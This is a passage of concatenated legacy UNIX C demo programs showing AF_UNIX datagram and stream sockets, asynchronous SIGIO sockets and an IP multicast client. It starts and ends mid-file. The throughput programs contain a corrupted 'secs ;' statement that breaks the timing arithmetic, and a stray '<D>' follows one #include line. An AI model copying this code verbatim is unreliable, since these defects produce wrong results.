	* 	an address in its recvfrom call and can use it to
	*	send data back to the client.
	*/

	bzero(&clntaddr, sizeof(clntaddr));
	clntaddr.sun_family = AF_UNIX;
	strcpy(clntaddr.sun_path, SOCKET_PATHCLNT);

	if (bind(sock, &clntaddr, sizeof(clntaddr)) < 0) {
		close(sock);
		perror("client: bind");
		exit(3);
	}

	/*	Set up address structure for server socket */

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sun_family = AF_UNIX;
	strcpy(servaddr.sun_path, SOCKET_PATH);

	for (j = 0; j < 5; j++) {
		sleep(1);
		slen = sendto(sock, sdata, 2000, 0, 
			(struct sockaddr *) &servaddr, sizeof(servaddr));
		if (slen<0) {
			perror("client: sendto");
			exit(4);
		}
		else {
			printf("client : sent %d bytes\n", slen);
			fromlen = sizeof(from);
			rlen = recvfrom(sock, rdata, 2000, 0, &from, &fromlen);
			if (rlen == -1) {
				perror("client: recvfrom\n");
				exit(5);
			} else 
				printf("client : received %d bytes\n", rlen);
		}
	}
	/*	Use unlink to remove the file (inode) so that the name
	*	will be available for the next run.
	*/
	sleep(1);
	unlink(SOCKET_PATHCLNT);
	close(sock);
	printf("Client done\n");
	exit(0);
}


timeout()		/* escape hatch so blocking calls don't wait forever */
{
	printf( "alarm went off -- stopping client\n" );
	fprintf(stderr, "stopping the client process\n");
	exit(6);
}
::::::::::::::
./usr/lib/demos/networking/af_unix/dgram/server.c
::::::::::::::
/*
* 	AF_UNIX datagram server process
*
*	This is an example program that demonstrates the use of AF_UNIX
*	datagram sockets as a BSD IPC mechanism.  This contains the
*	server, and is intended to operate in conjunction with the
*	client program.
*
*/
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/un.h>
#include <stdio.h>
#include <signal.h>
#include <netdb.h>

#define SOCKET_PATH 	"/tmp/myserver"
#define bzero(ptr, len)  memset((ptr), NULL, (len))

int	timeout();

main()
{
	int	sock;
	int	slen, rlen, expect;
	unsigned char	sdata[5000];
	struct  sockaddr_un servaddr;		/* address of server */
	struct	sockaddr_un from;
	int	fromlen;

	/* 	Escape hatch so blocking calls don't wait forever	*/

	signal(SIGALRM,timeout);
	alarm((unsigned long) 120);	

	/*	Create a UNIX datagram socket for server	*/

	if ((sock = socket(AF_UNIX, SOCK_DGRAM, 0)) < 0) {
		perror("server: socket");
		exit(1);
	}

	/*	Set up address structure for server socket	*/

	bzero(&servaddr, sizeof(servaddr));
	servaddr.sun_family = AF_UNIX;
	strcpy(servaddr.sun_path, SOCKET_PATH);

	if (bind(sock, &servaddr, sizeof(servaddr)) < 0) {
		close(sock);
		perror("server: bind");
		exit(2);
	}

	/*	Receive data from anyone and echo back data to the sender	
	*	Note that fromlen is passed as a pointer so the recvfrom
	*	call can return the size of the returned address.
	*/
	expect = 5 * 2000;
	while (expect > 0) {
		fromlen = sizeof(from);
		rlen = recvfrom(sock, sdata, 2000, 0, &from, &fromlen);
		if (rlen == -1) {
			perror("server : recv\n");
			exit(3);
		} else {
			expect -= rlen;
			printf("server : recv'd %d bytes\n",rlen);
			slen = sendto(sock, sdata, rlen, 0, &from, fromlen);
			if (slen <0) {
				perror ("server : sendto\n");
				exit (4);
			}
		}
	}
	/*	Use unlink to remove the file (inode) so that the name
	*	will be available for the next run.
	*/
	unlink(SOCKET_PATH);
	close(sock);
	printf("Server done\n");
	exit(0);
}


timeout()		/* escape hatch so blocking calls don't wait forever */
{
	printf( "alarm received -- stopping server\n" );
	fprintf(stderr, "stopping the server process\n");
	exit(5);
}
::::::::::::::
./usr/lib/demos/networking/af_unix/stream/catch.c
::::::::::::::
/*
 * 	Sample Program : AF_UNIX stream sockets, server process
 *
 *   	CATCH - RECEIVE DATA FROM THE PITCHER
 *
 *	Pitch and catch set up a simple unix domain stream socket
 *	client-server connection. The client (pitch) then sends data to
 *	server (catch), throughput is calculated, and the result is
 *	printed to the client's stdout.
 */
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h><D>

#define SOCKNAME    	"/tmp/p_n_c"
#define BUFSIZE		32*1024-1
int	timeout();
int	s;		/* server socket */

char buffer[BUFSIZE];
struct bullet {
     int bytes;
     int throughput;
     int magic;
} bullet = { 0, 0, 0 };

send_data(fd, buf, buflen)
     char *buf;
{
     int cc;

     while (buflen > 0) {
          cc = send(fd, buf, buflen, 0);

          if (cc == -1) {
               perror("send");
               exit(0);
          }

          buf += cc;
          buflen -= cc;
     }
}

recv_data(fd, buf, buflen)
     char *buf;
{
     int cc;

     while (buflen > 0) {
          cc = recv(fd, buf, buflen, 0);

          if (cc == -1) {
               perror("recv");
               exit(0);
          }

          buf += cc;
          buflen -= cc;
     }
}

main(argc, argv)
     int argc;
     char *argv[];
{
     int bufsize, bytes, cc, i, total, pid, counter_pid;
     float msec;
     struct timeval tp1, tp2;
     int ns, recvsize, secs, usec;
     struct timezone tzp;
     struct sockaddr_un sa;

/*
 * The SIGPIPE signal will be received if the peer has gone away and an attempt
 * is made to write data to the peer.  Ignoring this signal causes
 * the write operation to receive an EPIPE error.  Thus, the user is
 * informed about what happened.
*/
     signal(SIGPIPE, SIG_IGN);
     signal(SIGCLD, SIG_IGN);
     signal(SIGINT, timeout);

     setbuf(stdout, 0);
     setbuf(stderr, 0);
     if (argc > 1) {
          argv++;
          counter_pid = atoi(*argv++);
     } else
          counter_pid = 0;
/*
 * Set up the socket variables - address family, socket name.
 * They'll be used later to bind() the name to the server socket.
 */
     sa.sun_family = AF_UNIX;
     strncpy(sa.sun_path, SOCKNAME,
                    (sizeof(struct sockaddr_un) - sizeof(short)));
/*
 * Create the server socket
 */
     if ((s = socket( AF_UNIX, SOCK_STREAM, 0)) == -1) {
          perror("catch - socket failed");
          exit(0);
     }
     bufsize = BUFSIZE;
/*
 * Use setsockopt() to change the socket buffer size to improve throughput
 * for large data transfers
 */
     if ((setsockopt(s, SOL_SOCKET, SO_RCVBUF, &bufsize, sizeof(bufsize)))
          == -1) {
               perror("catch - setsockopt failed");
               exit(0);
     }
/*
 * Bind the server socket to its name
 */
     if ((bind(s, &sa, sizeof(struct sockaddr_un))) == -1) {
          perror("catch - bind failed");
          exit(0);
     }
/*
 * Call listen() to enable reception of connection requests
 * (listen() will silently change the given backlog, 0, to be 1 instead)
 */
     if ((listen(s, 0)) == -1) {
          perror("catch - listen failed");
          exit(0);
     }

next_conn:
     i = sizeof(struct sockaddr_un);
/*
 * Call accept() to accept the connection request. This call will block
 * until a connection request arrives.
 */
     if ((ns = accept(s, &sa, &i)) == -1) {
          if (errno == EINTR)
               goto next_conn;
          perror("catch - accept failed");
          exit(0);
     }
     if ((pid = fork()) != 0) {
          close(ns);
          goto next_conn;
     }
/*
 * Receive the bullet to synchronize with the other side
 */
     recv_data(ns, &bullet, sizeof(struct bullet));

     if (bullet.magic != 12345) {
          printf("catch: bad magic %d\n", bullet.magic);
          exit(0);
     }
     bytes = bullet.bytes;
     recvsize = (bytes>BUFSIZE)?BUFSIZE:bytes;
/*
 * Send the bullet back to complete synchronization
 */
     send_data(ns, &bullet, sizeof(struct bullet));

     cc = 0;
     if (counter_pid)
          kill(counter_pid, SIGUSR1);
     if (gettimeofday(&tp1, &tzp) == -1) {
          perror("catch time of day failed");
          exit(0);
     }
/*
 * Receive data from the client
 */
     total = 0;
     i = bytes;
     while (i > 0) {
          cc = recvsize < i ? recvsize : i;

          recv_data(ns, buffer, cc);
          total += cc;
          i -= cc;
     }
/*
 * Calculate throughput
 */
     if (gettimeofday(&tp2, &tzp) == -1) {
          perror("catch time of day failed");
          exit(0);
     }
     if (counter_pid)
          kill(counter_pid, SIGUSR2);
     secs = tp2.tv_sec - tp1.tv_sec;
     usec = tp2.tv_usec - tp1.tv_usec;
     if (usec < 0) {
          secs ;
          usec += 1000000;
     }
     msec = 1000*(float)secs;
     msec += (float)usec/1000;
     bullet.throughput = bytes/msec;
/*
 * Send back the bullet with throughput info, then close the
 * server socket
 */
     if ((cc = send(ns, &bullet, sizeof(struct bullet), 0)) == -1) {
          perror("catch - send end bullet failed");
          exit(0);
     }
     close(ns);
}

timeout()
{
	printf( "alarm went off -- stopping the catch process\n" );
	fprintf(stderr, "stopping the catch process\n");
	unlink(SOCKNAME);
	close(s);
	exit(6);
}
::::::::::::::
./usr/lib/demos/networking/af_unix/stream/pitch.c
::::::::::::::
/* 
*	Sample Program : AF_UNIX stream sockets, client process     
*
*    	PITCH - SEND DATA TO THE CATCHER
*
*	Pitch and catch set up a simple unix domain stream socket
*	client-server connection. The client (pitch) then sends data to
*	the server (catch), throughput is calculated, and the result is
*	printed to the client's stdout.
*/
#include <stdio.h>
#include <time.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#define SOCKNAME    "/tmp/p_n_c"

#define BUFSIZE          32*1024-1
char buffer[BUFSIZE];

struct bullet {
     int bytes;
     int throughput;
     int magic;
} bullet = { 0, 0, 12345 };

send_data(fd, buf, buflen)
     char *buf;
{
     int cc;

     while (buflen > 0) {
          cc = send(fd, buf, buflen, 0);

          if (cc == -1) {
               perror("send");
               exit(0);
          }

          buf += cc;
          buflen -= cc;
     }
}

recv_data(fd, buf, buflen)
     char *buf;
{
     int cc;

     while (buflen > 0) {
          cc = recv(fd, buf, buflen, 0);




          if (cc == -1) {
               perror("recv");
               exit(0);
          }
          buf += cc;
          buflen -= cc;
     }
}

main( argc, argv)
     int argc;
     char *argv[];
{
     int bufsize, bytes, cc, i, total, pid;
     float msec;
     struct timeval tp1, tp2;
     int s, sendsize, secs, usec;
     struct timezone tzp;
     struct sockaddr_un sa;

/*
 * The SIGPIPE signal will be received if the peer has gone away and
 * an attempt is made to write data to the peer.  Ignoring the signal causes
 * the write operation to receive an EPIPE error.  Thus, the user is
 * informed about what happened.
*/

signal(SIGPIPE, SIG_IGN);
     setbuf(stdout, 0);
     setbuf(stderr, 0);
     if (argc < 2) {
          printf("usage: pitch Kbytes [pid]\n");
          exit(0);
     }
     argv++;

/*
 * Set up the socket variables (address family; name of server socket)
 * (they'll be used later for the connect() call)
 */
     sa.sun_family = AF_UNIX;
     strncpy(sa.sun_path, SOCKNAME, 
		(sizeof(struct sockaddr_un) - sizeof(short)));
     bullet.bytes = bytes = 1024*atoi(*argv++);
     if (argc > 2)
          pid = atoi(*argv++);
     else
          pid = 0;
     sendsize = (bytes < BUFSIZE) ? bytes : BUFSIZE;
/*
 * Create the client socket
 */
     if ((s = socket( AF_UNIX, SOCK_STREAM, 0)) == -1) {
          perror("pitch - socket failed");
          exit(0);
     }
     bufsize = BUFSIZE;
/*
 * Change the default buffer size to improve throughput for
 * large data transfers
 */
     if ((setsockopt(s, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize)))
          == -1) {
               perror("pitch - setsockopt failed");
               exit(0);
     }
/*
 * Connect to the server
 */
     if ((connect(s, &sa, sizeof(struct sockaddr_un))) == - 1) {
          perror("pitch - connect failed");
          exit(0);
     }
/*
 * send and receive the bullet to synchronize both sides
 */
     send_data(s, &bullet, sizeof(struct bullet));
     recv_data(s, &bullet, sizeof(struct bullet));

     cc = 0;
     if (pid)
          kill(pid,SIGUSR1);
     if (gettimeofday(&tp1, &tzp) == -1) {
          perror("pitch time of day failed");
          exit(0);
     }
     i = bytes;
     total = 0;
/*
 * Send the data
 */
     while (i > 0) {
          cc = sendsize < i ? sendsize : i;
          send_data(s, buffer, cc);
          i -= cc;
          total += cc;
     }
/*
 * Receive the bullet to calculate throughput
 */
     recv_data(s, &bullet, sizeof(struct bullet));

     if (gettimeofday(&tp2, &tzp) == -1) {
          perror("pitch time of day failed");
          exit(0);
     }
     if (pid)
          kill(pid, SIGUSR2);
/*
 * Close the socket
 */
     close(s);
     secs = tp2.tv_sec - tp1.tv_sec;
     usec = tp2.tv_usec - tp1.tv_usec;
     if (usec < 0) {
          secs;
          usec += 1000000;
     }
     msec = 1000*(float)secs;
     msec += (float)usec/1000;
     printf("PITCH: %d Kbytes/sec\n", (int)(bytes/msec));
     printf("CATCH: %d Kbytes/sec\n", bullet.throughput);
     printf("AVG:   %d Kbytes/sec\n", ((int)(bytes/msec)+bullet.throughput)/2);
}
::::::::::::::
./usr/lib/demos/networking/socket/async.clnt.c
::::::::::::::
/*
*			A S Y N C . C L N T 
*
*	This is an example program that demonstrates the use
*	of Asynchronous datagram and stream sockets.  This 
*	contains the client, and is intended to operate in 
*	conjunction with the server program found in async.serv.
*	Together, these programs illustrate a very simple 
*	application of asynchronous sockets and therefore lacks
*	the robustness of typical situations.  A program capable of
*	handling all SIGIO interrupts requires substantial 
*	programmer investment and is beyond the scope of this 
*	example.
*
*	This program provides two services called "sigex_udp"
*	and "sigex_tcp", for datagram and streams, respectively.  In 
*	order for it to function, entries need to exist in the
*	/etc/services file.  The port address for these services can be
*	any port numbers that are likely to be unused, such as 22373
* 	and 22374, for example.  The host on which the client will 
*	be running must also have the same entries (same port numbers)
*	in its /etc/services file.
*
*  ALGORITHM for Async.clnt:
*
*	Set up:
*		Runstring
*		Address Family
*		Get the remote host's internet address
*	Datagram socket setup:
*		Create the datagram socket
*		Get the port address of desired service
*	Send datagram data
*	Sleep for 5 seconds
*	Streams socket setup:
*		Create the streams socket
*		Get the port address of desired service 
*		Request a connection
*	Send streams data
*		
*		
**********************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <netdb.h>

int	ds;				/* datagram socket descriptor */
int	ss;				/* streams socket descriptor */

struct hostent *hp;		/* pointer to host info for remote host */
struct servent *sp;		/* pointer to service information */

struct sockaddr_in myaddr_in;	/* for local socket address */
struct sockaddr_in peeraddr_in;	/* for peer socket address */

/********************************************************************
 *			M A I N
 *
 ********************************************************************/
main(argc, argv)
int	argc;
char	*argv[];
{
	int	addrlen;

	if (argc != 4) {
		fprintf(stderr, 
		    "Usage:  %s <remote host> <datagram data> <streams data> \n\n", argv[0]);
		exit(1);
	}

	/* Set up the peer address to which we will connect. */
	peeraddr_in.sin_family = AF_INET;

	/* Get the host information for the hostname that the
		 * user passed in.
		 */
	hp = gethostbyname (argv[1]);
	if (hp == NULL) {
		fprintf(stderr, "%s: %s not found in /etc/hosts\n",
		    argv[0], argv[1]);
		exit(1);
	}
	peeraddr_in.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;

	/*	Create the local datagram socket */
	ds = socket (AF_INET, SOCK_DGRAM, 0);
	if (ds == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create datagram socket\n", argv[0]);
		exit(1);
	}

	/* Find the information for the "sigex_udp " server
		 * in order to get the needed port number.
		 */
	sp = getservbyname ("sigex_udp", "udp");
	if (sp == NULL) {
		fprintf(stderr, "%s: sigex_udp not found in /etc/services\n",
		    argv[0]);
		exit(1);
	}
	peeraddr_in.sin_port = sp->s_port;


	/*  Send data over the datagram socket. This will
		*   cause the server process to recieve a SIGIO 
		*   interrupt.  The server will use select to determine
		*   which of its sockets interrupted and then do the 
		*   appropriate action.
		*/
	if (sendto(ds, argv[2], strlen(argv[2]), 0, &peeraddr_in, 
	    sizeof(struct sockaddr_in )) == -1)  {
		fprintf(stderr, "%s: Datagram Sendto failed. ", argv[0]);
		perror(argv[0]);
		exit(1);
	}
	printf(" %s : Sent a datagram packet. \n", argv[0]);

	/*  This sleep simulates any processing that a real client
		*   might be do here.  
		*/
	sleep(5);

	/* Create the local streams socket. */
	ss = socket (AF_INET, SOCK_STREAM, 0);
	if (ss == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create socket\n", argv[0]);
		exit(1);
	}

	/*  Setup the address information for the remote 
		*   streams socket.  
		*/
	sp = getservbyname ("sigex_tcp", "tcp");
	if (sp == NULL) {
		fprintf(stderr, "%s: sigex_tcp not found in /etc/services\n",
		    argv[0]);
		exit(1);
	}
	peeraddr_in.sin_port = sp->s_port;

	/* Try to connect to the remote server at the address
		*    which was just built into peeraddr.
		*    This will cause another SIGIO interrupt of the 
		*    server.  When the server identifies the interrupting
		*    socket (select(2)), it will accept the connection
		*    request without blocking.
		*/
	if (connect(ss, &peeraddr_in, sizeof(struct sockaddr_in )) == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to connect to remote\n", argv[0]);
		exit(1);
	}

	/*   Send data to the server over the stream socket. 
		*    This will cause yet another SIGIO interrupt of the 
		*    server.  In this case, the interrupt will be ignored 
		*    because the server is already waiting for data
		*    (see async.serv). 
		*/
	if (sendto(ss, argv[3], strlen(argv[3]), 0, &peeraddr_in, 
	    sizeof(struct sockaddr_in )) == -1)  {
		fprintf(stderr, "%s: Streams Sendto failed. ", argv[0]);
		perror(argv[0]);
		exit(1);
	}
	printf(" %s : Sent a streams packet. \n", argv[0]);


	/* Print message indicating completion of task. */
	printf("%s : Finished!\n ", argv[0]);
} /*  end main */


::::::::::::::
./usr/lib/demos/networking/socket/async.serv.c
::::::::::::::
/*
*			A S Y N C . S E R V
*
*	This is an example program that demonstrates the use
*	of Asynchronous datagram and stream sockets.  This 
*	contains the server, and is intended to operate in 
*	conjunction with the client program found in async.clnt.
*	Together, these programs illustrate a very simple 
*	application of asynchronous sockets and therefore lacks
*	the robustness of typical situations.  A program capable of
*	handling all SIGIO interrupts requires substantial 
*	programmer investment and is beyond the scope of this 
*	example.
*
*	This program provides two services called "sigex_udp"
*	and "sigex_tcp", for datagram and streams, respectively.  In 
*	order for it to function, entries need to exist in the
*	/etc/services file.  The port address for these services can be
*	any port numbers that are likely to be unused, such as 22373
* 	and 22374, for example.  The host on which the client will 
*	be running must also have the same entries (same port numbers)
*	in its /etc/services file.
*
* Algorithm for Async.serv:
*
*	Set up: 
*		Catch SIGIO signal
*		Address family
*		Local internet address = wildcard
*	Datagram socket setup:
*		Get the port address of the desired service
*		Create the datagram socket
*		Bind socket and make it asynchronous (set_up_async())
*	Streams socket setup:
*		Get the port address of the desired service
*		Create the streams socket
*		Bind socket and make it asynchronous (set_up_async())
*		Create a listen queue for the socket
*	Loop Forever or Until SIGIO interrupt 
*
* Algorithm for Async.serv's interrupt handler :
*
*	Set up:
*		Define Macros
*		Notify operator of interrupt
*		Set readmask for our datagram and streams sockets
*		Set select call timeout to zero
*	Select on datagram and streams sockets
*	If datagram socket selected
*		Read and print out data
*	Endif
*	If streams socket selected
*		Accept the connection request
*		Read and print out data
*		Exit
*	Endif
*
************************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <netdb.h>

int	ds;			/* datagram socket descriptor */
int	ss;			/* streams socket descriptor  */

struct hostent *hp;	/* ptr to host info for remote host */
struct servent *sp; 	/* ptr to service information */
struct sockaddr_in myaddr; 	/* local socket address */
struct sockaddr_in peeraddr_in;  /* remote socket address */

/**************************************************************
*                         M A I N
*
***************************************************************/
main(argc, argv)
int	argc;
char	*argv[];
{

	struct sigvec vec;
	int	io_handler();	/* SIGIO interrupt handler */


	/* Set up asynchronous notification of socket event */
	vec.sv_handler = (void *) io_handler;
	vec.sv_mask = 0;
	vec.sv_flags = 0;
	if ( sigvector(SIGIO, &vec, (struct sigvec *) 0) == -1)
		perror(" sigvector(SIGIO)");

	/* Set the Address Family */
	myaddr.sin_family = AF_INET;

	/*  Use a wildcard for the local internet address */
	myaddr.sin_addr.s_addr = INADDR_ANY;

	/* Get the port address of my service & insert 
		*  it in data struct.
		*/
	sp = getservbyname("sigex_udp", "udp");
	if (sp == NULL) {
		printf(" sigex_udp service not found in /etc/services\n");
		exit(1);
	}
	myaddr.sin_port = sp->s_port;

	/* Create the datagram socket */
	ds = socket(myaddr.sin_family, SOCK_DGRAM, 0);
	if (ds == -1) {
		perror(argv[0]);
		printf("%s: unable to create datagram socket\n", argv[0]);
		exit(1);
	}

	/*  Make this socket asynchronous  */
	set_up_async(ds);


	/* Get the streams socket port address information */
	sp = getservbyname("sigex_tcp", "tcp");
	if (sp == NULL) {
		printf("%s: sigex_tcp service not found in /etc/services\n");
		exit(1);
	}
	myaddr.sin_port = sp->s_port;

	/* Create the stream socket */
	ss = socket(myaddr.sin_family, SOCK_STREAM, 0);
	if (ss == -1) {
		perror(argv[0]);
		printf("%s: unable to create datagram socket\n", argv[0]);
		exit(1);
	}

	/*  Make this socket asynchronous  */
	set_up_async(ss);


	/* Create a listen queue for the stream socket */
	/* Listen call doesn't apply to datagram sockets */
	if (listen(ss, 5) == -1 ) {
		perror(argv[0]);
		printf("%s: unable to listen \n", argv[0]);
		exit(1);
	}

	/*
		*  The following loop simulates any other processing
		*  that the server might do here.  The SIGIO interrupt
		*  will break this loop and execution will go to the
		*  interrupt handler.
		*/
	printf(" Server entering a tight loop...\n\n");
	for (; ; ) {
	}

} /* end main */


/*****************************************************************
*	SET_UP_ASYNC(S)
*	This routine will bind the sockets and activate asynchronous 
*	notification of a socket event.
******************************************************************/
set_up_async(s)
int	s;
{
	int	flag = 1;


	/* Bind the listen address to the socket */
	if (bind(s, &myaddr, sizeof(myaddr)) == -1) {
		perror(" unable to bind address\n");
		exit(1);
	}

	/*  Set the socket state for Asynchronous  */
	if (ioctl(s, FIOASYNC, &flag) == -1) {
		perror(" can't set async on socket ");
		exit(1);
	}

	/* Arrange for the current process to receive 
		*  SIGIO when the state of the socket changes. 
	   	*  Process group positive == deliver to process.
		*/
	flag = getpid();
	if (ioctl(s, SIOCSPGRP, &flag) == -1) {
		perror("can't get the process group.");
	}
} /* end set_up_async */


#include <sys/param.h>  /* standard parameter definitions */

/****************************************************************
*	IO_HANDLER()
* 	Execution jumps here upon receipt of the SIGIO interrupt.
******************************************************************/
io_handler()

#define BPI 32		/* bits per int */
#define DONT_CARE	(char *) 0
#define BUFLEN	100

{
	struct fd_mask {
		u_long fds_bits[NOFILE/BPI+1]; /* NOFILE max # of fd's per process */
	};
	struct fd_mask readmask;
	int	numfds;
	char	buf[BUFLEN];
	int	count;
	int	s;
	struct timeval {
		unsigned long	tv_sec;		/* seconds */
		long	tv_usec;	/* and microseconds */
	} timeout;

	memset (buf, 0, BUFLEN);

	/*  Notify operator of SIGIO interrupt */
	printf(" SIGIO interrupt received!\n\n");

	/*  setup the masks */
	FD_ZERO(&readmask);
	FD_SET(ds, &readmask);
	FD_SET(ss, &readmask);

	/*  set the timeout value  */
	timeout.tv_sec = 0;
	timeout.tv_usec = 0;

	/*  select on socket descriptors */
	if ((numfds = select(ss + 1, &readmask, DONT_CARE,
	    DONT_CARE, &timeout))  < 0) {
		perror("select failed ");
		exit(1);
	}
	if (numfds == 0) {
		printf(" unexpected condition - investigate.\n");
		exit(1);
	}
	if (FD_ISSET(ds, &readmask)) {
		/* a packet has come in, read it */
		count = recv(ds, buf, BUFLEN, 0);
		buf[count] = '\0';
		printf(" received a datagram packet of data: %s\n\n", buf);
	}
	if (FD_ISSET(ss, &readmask)) {
		/* another program requests connection */
		s = accept(ss, &peeraddr_in, sizeof(struct sockaddr_in ));
		if (s == -1 ) {
			perror(" accept call failed ");
			exit(1);
		}
		printf(" accepted a connection request\n");

		/*  Note that the following recv call will block
			*   until data becomes available.  A real server
			*   would probably include code to handle the
			*   recv call asynchronously, thereby avoiding 
			*   this block.
			*/
		count = recv(s, buf, BUFLEN, 0);
		if (count == -1 ) {
			perror(" receive error") ;
			exit(1);
		}
		buf[count] = '\0';
		printf(" received a streams packet of data: %s\n\n", buf);
		printf(" async.serv : Finished!\n");
		exit(0);
	}
} /* end io_handler */


::::::::::::::
./usr/lib/demos/networking/socket/client.mcast.c
::::::::::::::
/*
 *		C L I E N T . U D P . M U L T I C A S T
 *
 *	This is an example program that demonstrates the use of
 *	datagram sockets using IP multicast as an IPC mechanism.  This 
 * 	contains the client, and is intended to operate in conjunction with 
 * 	the server program found in serv.udp.multicast.  Together, these two 
 * 	programs demonstrate many of the features of sockets, as well as good
 *	conventions for using these features.
 *
 *	This program requests a service called "example".  In order for
 *	it to function, an entry for it needs to exist in the
 *	/etc/services file.  The port address for this service can be
 *	any port number that is likely to be unused, such as 22375,
 *	for example.  The host on which the server will be running
 *	must also have the same entry (and the same port number) in its
 *	/etc/services file.
 *
 *	The "example" service is an example of a simple name server
 *	application.  The host that is to provide this service is
 *	required to be in the /etc/hosts file.  Also, the host
 *	providing this service presumably knows the internet addresses
 *	of many hosts which the local host does not.  Therefore,
 *	this program will request the internet address of a target
 *	host by name from the serving host.  The serving host(s)
 *	will return the requested internet address as a response,
 *	and will return an address of all ones if it does not recognize
 *	the host name.
 *
 */

#ifndef lint
static char __revid[] = "@(#) mcastclient.c $Revision: 1.3.116.1 $ $Date: 95/10/17 15:38:54 $";
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <stdio.h>
#include <signal.h>
#include <netdb.h>
#include <time.h>

extern int errno;

int s;				/* socket descriptor */

struct hostent *hp;		/* pointer to host info for nameserver host */
struct servent *sp;		/* pointer to service information */
struct in_addr ifaddr;		/* for specifying interface to use */

struct sockaddr_in myaddr;	/* for local socket address */
struct sockaddr_in mcastaddr;	/* for server multicast socket address */
struct sockaddr_in servaddr;	/* for server IP address */
struct in_addr reqaddr;		/* for returned internet address */
u_char  ttl;                    /* Set TTL */
u_char  loop;                   /* enable or disable loopback */

#define ADDRNOTFOUND	0xffffffff	/* value returned for unknown host */
#define RETRIES		5		/* number resends before giving up */
#define TIMEOUT		200		/* milliseconds between sending */

/*
 *			H A N D L E R
 *
 *	This routine is the signal handler for the alarm signal.
 *	Although it does nothing here, having it ensures that timer
 *	expiration is neither ignored nor treated as an error.
 */
handler() { }

/*
 *			M A I N
 *
 *	This routine is the client which requests service from the remote
 *	"example server".  It will send a multicast message to the remote 
 *	nameserver requesting the internet address corresponding to a given 
 *	hostname. The server will look up the name, and return its internet 
 * 	address. The returned address will be written to stdout.
 *
 *	The multicast address of the multicast server to which the requests 
 *	will be sent is given as the first parameter to the command.  The 
 *	second parameter should be the interface address in dot format that is 
 * 	to be used to transmit the request to the multicast server.  One may 
 *	choose to specify an IP address of "0.0.0.0" to let the system choose
 *	a default interface instead.  The third parameter is the the name of 
 *	the target host for which the internet address is sought.
 */
main(argc, argv)
int argc;
char *argv[];
{
	int i, x, addrlen;
	int retry = RETRIES, retry0 = RETRIES;  /* holds the retry count */
	struct timeval t, oldt, delta;
	char *inet_ntoa(), *getenv(), *p;

	if (argc != 4) {
		fprintf(stderr, "Usage:     %s server_mcast_ipaddr "
		        "interface_ipaddr hostname_to_lookup\n",
                        argv[0]);
		fprintf(stderr, "Normally:  %s server_mcast_ipaddr "
                        "0.0.0.0 hostname_to_lookup\n", argv[0]);
		exit(1);
	}

	/*
	 * get total time-out in seconds and derive retry count.
	 */
	if ( (p = getenv("CLIENT_MCAST_TIMEOUT")) && (i = atoi(p)) > 0)
	   retry = retry0 = (i*1000 + TIMEOUT - 1) / TIMEOUT;

	/*
	 * clear out address structures 
	 */
	memset ((char *)&myaddr, 0, sizeof(struct sockaddr_in));
	memset ((char *)&mcastaddr, 0, sizeof(mcastaddr));

	/* 
	 * Find the information for the "example" server
	 * in order to get the needed port number.
	 */
	sp = getservbyname("example", "udp");
	if (sp == NULL) {
		fprintf(stderr, "%s: \"example\" not found in /etc/services."
		        "  Add the line:\n", argv[0]);
		fprintf(stderr, "   \"example  nnnnn/udp\", where \"nnnnn\" "
		        "is the server's port number\n");
		exit(1);
	}
	mcastaddr.sin_port = sp->s_port;

	/* 
	 * Create the socket. 
	 */
	s = socket (AF_INET, SOCK_DGRAM, 0);
	if (s == -1) {
		perror(argv[0]);
		fprintf(stderr, "%s: unable to create socket\n", argv[0]);
		exit(1);
	}

	/* 
	 * Set up the mcast_server address.
	 */
	mcastaddr.sin_family = AF_INET;
	mcastaddr.sin_addr.s_addr = inet_addr(argv[1]);

	/*
	 * Normally, specify "0.0.0.0" for argv[2] to allow the kernel
	 * to select an appropriate interface based on route configuration.
	 */
	if ( (ifaddr.s_addr = inet_addr(argv[2])) == -1) {
		perror(argv[0]);
		printf("%s: Using system defined default interface instead of "
		       "%s\n", argv[0], argv[2]);
		ifaddr.s_addr = INADDR_ANY;
	}

	/* We only need to set IP_MULTICAST_IF if ifaddr is not INADDR_ANY.
	 * Otherwise, the effect is the same as setting IP_MULTICAST_IF to
	 * INADDR_ANY.
	 */
	if (ifaddr.s_addr != INADDR_ANY) {
        	if (setsockopt(s, IPPROTO_IP, IP_MULTICAST_IF, &ifaddr,
		               sizeof(struct in_addr)) == -1) {
                	perror(argv[0]);
                	printf("%s: unable to specify interface\n", argv[0]);
                	exit (1);
        	}
        }

	/*
	 * By default, multicast datagrams are sent only on the local
	 * network.  Normally, this is sufficient.
	 *
	 * Set TTL to, say, 64 (TTL range:  0 <= ttl <= 255), so that
	 * multicast datagrams may be forwarded to distant networks.
	 * However, forwarding will only occur if there is special
	 * multicast router on the local and intermediate networks.
	 */
	ttl = 64;
        if (setsockopt(s, IPPROTO_IP, IP_MULTICAST_TTL, &ttl,
	               sizeof(ttl)) == -1) {
                perror(argv[0]);
                printf("%s: unable to specify ttl\n", argv[0]);
                exit (1);
        }

#if 0   /* change 0 to 1 to disable loopback; normally, we do not want this */
	/*
         * We may try to disable loopback of multicast packets, but this
	 * might not be effective on some interfaces if loopback always
	 * occurs at the driver or interface level.
	 *
	 * Anyway, this is usually not desirable because it would prevent
	 * us from using a local server.
	 */
	loop = 0;
        if (setsockopt(s, IPPROTO_IP, IP_MULTICAST_LOOP, &loop,
	               sizeof(loop)) == -1) {
                perror(argv[0]);
                printf("%s: unable to disable loopback\n", argv[0]);
        }
#endif
	/* 
	 * Bind socket to some local address so that the
	 * server can send the reply back.  A port number
	 * of zero will be used so that the system will
	 * assign any available port number.  An address
